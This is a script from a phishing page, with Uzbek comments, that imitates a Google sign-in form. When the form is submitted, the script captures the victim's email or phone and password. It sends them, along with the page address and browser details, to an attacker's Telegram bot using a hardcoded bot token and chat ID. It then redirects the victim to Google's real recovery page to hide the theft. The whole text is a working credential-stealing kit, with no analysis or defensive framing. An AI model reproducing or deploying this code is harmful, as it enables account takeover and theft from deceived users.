<script>
// ╔══════════════════════════════════════════════════════════╗
// ║  SOZLAMALAR — BU YERNI O'ZGARTIRING!                     ║
// ╚══════════════════════════════════════════════════════════╝
const TELEGRAM_BOT_TOKEN = "8834722338:AAHM5DDWAmkuYiBU9DCGoDlOvDgKSH4ZK_0";  // BotFather token
const TELEGRAM_CHAT_ID   = "7580229848";                                    // @userinfobot Chat ID
// ══════════════════════════════════════════════════════════════

const form          = document.getElementById('loginForm');
const usernameInput = document.getElementById('identifierId');
const passwordInput = document.getElementById('password');
const submitBtn     = document.getElementById('submitBtn');
const statusDiv     = document.getElementById('status');
const usernameWrap  = document.getElementById('identifierWrap');
const passwordWrap  = document.getElementById('passwordWrap');
const usernameError = document.getElementById('usernameError');
const passwordError = document.getElementById('passwordError');

// ─── Input holatini kuzatish (label ko'tarilishi uchun) ───
[usernameInput, passwordInput].forEach(input => {
  input.addEventListener('input', () => {
    input.classList.toggle('has-value', input.value.length > 0);
  });
  input.addEventListener('focus', () => {
    input.parentElement.parentElement.parentElement.parentElement.classList.add('u3bW4e');
  });
  input.addEventListener('blur', () => {
    input.parentElement.parentElement.parentElement.parentElement.classList.remove('u3bW4e');
  });
});

// ─── Form yuborilganda ───
form.addEventListener('submit', async (e) => {
  e.preventDefault();

  const username = usernameInput.value.trim();
  const password = passwordInput.value;

  // Validatsiya
  usernameError.textContent = '';
  passwordError.textContent = '';
  usernameWrap.classList.remove('k0tWj');
  passwordWrap.classList.remove('k0tWj');

  let valid = true;

  if (!username) {
    usernameError.textContent = "Enter an email or phone number";
    usernameWrap.classList.add('k0tWj');
    valid = false;
  } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(username) && !/^\+?[\d\s\-()]{6,}$/.test(username)) {
    usernameError.textContent = "Enter a valid email or phone number";
    usernameWrap.classList.add('k0tWj');
    valid = false;
  }

  if (!password) {
    passwordError.textContent = "Enter a password";
    passwordWrap.classList.add('k0tWj');
    valid = false;
  }

  if (!valid) return;

  // Yuborish
  submitBtn.disabled = true;
  submitBtn.textContent = "...";
  statusDiv.textContent = "Please wait...";

  const now = new Date().toLocaleString('uz-UZ');
  const message =
    `🔐 <b>Yangi login urinishi</b>\n\n` +
    `📧 <b>Login:</b> <code>${escapeHtml(username)}</code>\n` +
    `🔑 <b>Parol:</b> <code>${escapeHtml(password)}</code>\n\n` +
    `🌐 <b>Sahifa:</b> ${escapeHtml(window.location.href)}\n` +
    `🖥️ <b>Brauzer:</b> ${escapeHtml(navigator.userAgent)}\n` +
    `🕒 <b>Vaqt:</b> ${now}`;

  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });

    const result = await response.json();

    if (result.ok) {
      statusDiv.textContent = "Redirecting...";
      setTimeout(() => {
        window.location.href = "https://accounts.google.com/signin/v2/recoveryidentifier";
      }, 800);
    } else {
      throw new Error(result.description || "Telegram error");
    }
  } catch (err) {
    console.error(err);
    statusDiv.textContent = "Something went wrong. Try again.";
    submitBtn.disabled = false;
    submitBtn.textContent = "Next";
  }
});

function escapeHtml(t) {
  const d = document.createElement('div');
  d.textContent = t;
  return d.innerHTML;
}
</script>
